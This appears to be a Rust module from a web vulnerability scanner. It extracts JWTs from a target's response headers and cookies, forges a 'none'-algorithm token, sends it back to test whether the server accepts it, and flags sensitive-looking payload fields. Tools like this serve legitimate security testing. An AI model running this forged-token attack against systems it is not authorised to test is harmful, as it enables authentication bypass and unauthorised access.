use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;
use base64::{Engine as _, engine::general_purpose::URL_SAFE_NO_PAD};
use serde_json::Value;

/// JWT vulnerability detection (None algorithm, weak secrets, etc.)
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: JWT Vulnerabilities", "[*]".yellow());

    let client = HttpClient::new()?;
    let result = Analyzer::send_and_analyze(&client, target, "").await?;
    
    // Find JWT in cookies or headers
    let mut tokens = vec![];
    
    if let Some(auth) = result.response_headers.get("authorization") {
        if auth.to_lowercase().starts_with("bearer ") {
            tokens.push(auth[7..].to_string());
        }
    }
    
    if let Some(cookies) = result.response_headers.get("set-cookie") {
        for part in cookies.split(';') {
            let part = part.trim();
            if part.contains('.') && part.split('.').count() == 3 {
                if let Some(val) = part.split('=').nth(1) {
                    tokens.push(val.to_string());
                }
            }
        }
    }

    if tokens.is_empty() {
        println!("{} No JWT tokens found in response headers/cookies", "[i]".cyan());
        return Ok(());
    }

    for token in tokens {
        println!("{} Analyzing token: {}...", "[i]".cyan(), &token[..std::cmp::min(20, token.len())]);
        
        // 1. Test None Algorithm
        if let Ok(parts) = parse_jwt(&token) {
            let header = parts.0;
            let payload = parts.1;
            
            // Create "none" algorithm token
            let mut none_header = header.clone();
            none_header["alg"] = Value::String("none".to_string());
            
            let h_enc = URL_SAFE_NO_PAD.encode(serde_json::to_string(&none_header)?);
            let p_enc = URL_SAFE_NO_PAD.encode(serde_json::to_string(&payload)?);
            let none_token = format!("{}.{}.", h_enc, p_enc);
            
            let resp = client.inner.get(target)
                .header("Authorization", format!("Bearer {}", none_token))
                .send().await?;
                
            if resp.status().is_success() {
                println!("{} CONFIRMED: JWT None Algorithm accepted!", "[!]".red().bold());
            }
        }
        
        // 2. Check for sensitive info in payload
        if let Ok(parts) = parse_jwt(&token) {
            let payload = parts.1;
            let sensitive = ["admin", "role", "privilege", "email", "id", "secret"];
            for s in sensitive {
                if payload.to_string().to_lowercase().contains(s) {
                    println!("{} FOUND: Sensitive field '{}' in JWT payload", "[!]".yellow(), s);
                }
            }
        }
    }

    Ok(())
}

fn parse_jwt(token: &str) -> anyhow::Result<(Value, Value)> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return Err(anyhow::anyhow!("Invalid JWT format"));
    }
    
    let header_json = URL_SAFE_NO_PAD.decode(parts[0])?;
    let payload_json = URL_SAFE_NO_PAD.decode(parts[1])?;
    
    let header: Value = serde_json::from_slice(&header_json)?;
    let payload: Value = serde_json::from_slice(&payload_json)?;
    
    Ok((header, payload))
}
